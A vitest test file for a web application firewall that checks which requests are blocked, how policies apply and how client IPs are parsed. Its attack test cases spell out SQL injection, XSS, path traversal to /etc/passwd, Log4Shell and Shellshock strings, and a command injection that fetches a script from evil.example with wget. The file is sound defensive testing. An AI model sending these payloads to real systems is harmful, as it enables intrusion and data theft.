import { describe, expect, it } from "vitest";
import { cleanIp, clientIpFrom, ipInList } from "@/lib/security/ip";
import { decode, inspect, type Policy, type Probe } from "@/lib/security/waf";

const ALL_ON = { sqli: true, xss: true, traversal: true, probes: true, scanners: true, protocol: true, injection: true };
const POLICY: Policy = { mode: "block", rules: ALL_ON, allowIps: [], blockIps: [], blockCountries: [], custom: [] };
const UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15";

function probe(url: string, extra: Partial<Probe> = {}): Probe {
  const u = new URL(url, "https://app.cloudesk.example");
  return { ip: "203.0.113.7", country: "IN", method: "GET", host: "app.cloudesk.example", path: u.pathname, query: u.search.replace(/^\?/, ""), ua: UA, referer: "", headers: [], ...extra };
}
const verdict = (url: string, extra: Partial<Probe> = {}, policy = POLICY) => inspect(probe(url, extra), policy);

describe("attacks are refused", () => {
  const attacks: [string, string, Partial<Probe>?][] = [
    ["/api/v1/products?id=1 UNION SELECT username,password FROM users", "sqli-union"],
    ["/search?q=1%27%20OR%20%271%27%3D%271", "sqli-tautology"],
    ["/search?q=%2527%2520or%25201%253D1", "sqli-tautology"],
    ["/items?id=1;DROP TABLE users", "sqli-stacked"],
    ["/items?id=1 AND pg_sleep(5)", "sqli-timing"],
    ["/items?id=1/**/UNION/**/SELECT/**/1", "sqli-union"],
    ["/x?id=1 from information_schema.tables", "sqli-schema"],
    ["/search?q=<script>alert(1)</script>", "xss-script"],
    ["/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", "xss-handler"],
    ["/r?next=javascript:alert(document.cookie)", "xss-js-uri"],
    ["/x?a=<svg/onload=alert(1)>", "xss-tags"],
    ["/assets/..%2f..%2f..%2fetc/passwd", "traversal-dots"],
    ["/download?file=....//....//etc/passwd", "traversal-files"],
    ["/.env", "probe-secrets"],
    ["/.git/config", "probe-secrets"],
    ["/wp-login.php", "probe-cms"],
    ["/phpmyadmin/index.php", "probe-cms"],
    ["/shell.php", "probe-scripts"],
    ["/backup.zip", "probe-dumps"],
    ["/", "scanner-ua", { ua: "sqlmap/1.7.2#stable (https://sqlmap.org)" }],
    ["/", "scanner-ua", { ua: "Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))" }],
    ["/", "inj-log4shell", { ua: "${jndi:ldap://evil.example/a}" }],
    ["/", "inj-shellshock", { ua: "() { :; }; /bin/bash -c 'cat /etc/passwd'" }],
    ["/ping?host=8.8.8.8;wget http://evil.example/x.sh -O-", "inj-command"],
    ["/x?name={{7*7}}", "inj-ssti"],
    ["/fetch?url=http://169.254.169.254/latest/meta-data/", "inj-metadata"],
    ["/x?a=%0d%0aSet-Cookie:%20admin=1", "inj-crlf"],
    ["/", "protocol", { method: "TRACE" }],
  ];
  for (const [url, rule, extra] of attacks) {
    it(`${rule}: ${url.slice(0, 60)}${extra?.ua ? ` (${extra.ua.slice(0, 30)})` : ""}${extra?.method ? ` ${extra.method}` : ""}`, () => {
      const v = verdict(url, extra);
      expect(v.action).toBe("block");
      expect(v.action !== "pass" && v.action !== "allow" && v.rule).toBe(rule);
    });
  }
});

describe("everyday requests pass", () => {
  const fine = [
    "/",
    "/features/website-builder",
    "/api/v1/orgs/8b0c9f8e-1a2b-4c3d-9e8f-0123456789ab/crm/contacts?q=O%27Brien&sort=name&page=2",
    "/search?q=union+bank+of+india",
    "/search?q=select+a+plan",
    "/search?q=drop+shipping+and+delivery",
    "/blog?q=javascript%3A+the+good+parts",
    "/search?q=Tom+%26+Jerry%27s+or+something",
    "/api/v1/orgs/x/invoicing/documents?status=paid&from=2026-01-01&to=2026-03-31",
    "/api/v1/plans",
    "/d/menu?category=Biryani+%26+rice",
    "/r?next=%2Fsettings%2Fbilling%3Fadd%3Dhr",
    "/s/abc123/products/caf%C3%A9-latte",
    "/api/v1/orgs/x/hr/people?filter=%7B%22department%22%3A%22Sales%22%7D",
    "/login?email=asha%40example.com&welcome=1",
    "/api/v1/orgs/x/mail/search?q=from%3Aravi+subject%3A%22invoice+2026%22",
  ];
  for (const url of fine) it(url, () => expect(verdict(url).action).toBe("pass"));
  it("ordinary browsers and API clients", () => {
    expect(verdict("/", { ua: "curl/8.4.0" }).action).toBe("pass");
    expect(verdict("/", { ua: "python-requests/2.31" }).action).toBe("pass");
    expect(verdict("/", { ua: "" }).action).toBe("pass");
  });
});

describe("policy", () => {
  it("monitor mode logs instead of blocking; off checks nothing", () => {
    expect(verdict("/.env", {}, { ...POLICY, mode: "monitor" }).action).toBe("log");
    expect(verdict("/.env", {}, { ...POLICY, mode: "off" }).action).toBe("pass");
  });
  it("allow-listed addresses skip every rule; blocked ones and countries are refused", () => {
    expect(verdict("/.env", {}, { ...POLICY, allowIps: ["203.0.113.0/24"] }).action).toBe("allow");
    expect(verdict("/", {}, { ...POLICY, blockIps: ["203.0.113.7"] })).toMatchObject({ action: "block", rule: "ip-block" });
    expect(verdict("/", { country: "kp" }, { ...POLICY, blockCountries: ["KP"] })).toMatchObject({ action: "block", rule: "country-block" });
  });
  it("custom rules run first, by field and operator", () => {
    const custom: Policy["custom"] = [
      { id: "office-admin", name: "Admin only from the office", enabled: true, action: "block", field: "path", op: "starts", value: "/admin" },
      { id: "ok-bot", name: "Our uptime checker", enabled: true, action: "allow", field: "ua", op: "contains", value: "CloudeskUptime" },
      { id: "off", name: "Disabled", enabled: false, action: "block", field: "path", op: "equals", value: "/" },
    ];
    expect(verdict("/admin/users", {}, { ...POLICY, custom })).toMatchObject({ action: "block", rule: "custom:office-admin" });
    expect(verdict("/.env", { ua: "CloudeskUptime/1.0" }, { ...POLICY, custom })).toMatchObject({ action: "allow" });
    expect(verdict("/", {}, { ...POLICY, custom }).action).toBe("pass");
  });
  it("refuses dangerous custom regexes instead of running them", () => {
    const custom: Policy["custom"] = [{ id: "redos", name: "x", enabled: true, action: "block", field: "path", op: "regex", value: "(a+)+$" }];
    expect(verdict("/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!", {}, { ...POLICY, custom }).action).toBe("pass");
  });
  it("decodes double encoding and strips SQL comments", () => {
    expect(decode("%253Cscript%253E")).toBe("<script>");
    expect(decode("UN/**/ION")).toBe("UN ION");
  });
});

describe("visitor addresses", () => {
  const h = (o: Record<string, string>) => new Headers(o);
  it("reads the header the platform trusts, and validates it", () => {
    const headers = h({ "x-forwarded-for": "1.1.1.1, 10.0.0.2", "x-real-ip": "10.0.0.3", "cf-connecting-ip": "2.2.2.2" });
    expect(clientIpFrom(headers, "xff-first")).toBe("1.1.1.1");
    expect(clientIpFrom(headers, "xff-last")).toBe("10.0.0.2");
    expect(clientIpFrom(headers, "x-real-ip")).toBe("10.0.0.3");
    expect(clientIpFrom(headers, "cloudflare")).toBe("2.2.2.2");
    expect(clientIpFrom(h({ "x-forwarded-for": "<script>, 999.1.1.1" }), "xff-first")).toBeNull();
    expect(cleanIp("[2001:db8::1]:443")).toBe("2001:db8::1");
    expect(cleanIp("::ffff:192.168.1.9")).toBe("192.168.1.9");
    expect(cleanIp("8.8.8.8:53")).toBe("8.8.8.8");
  });
  it("matches addresses and IPv4 ranges", () => {
    expect(ipInList("10.1.2.3", ["10.0.0.0/8"])).toBe(true);
    expect(ipInList("11.1.2.3", ["10.0.0.0/8"])).toBe(false);
    expect(ipInList("192.168.1.5", ["192.168.1.0/30"])).toBe(false);
    expect(ipInList("2001:db8::1", ["2001:db8::1"])).toBe(true);
    expect(ipInList(null, ["0.0.0.0/0"])).toBe(false);
  });
});
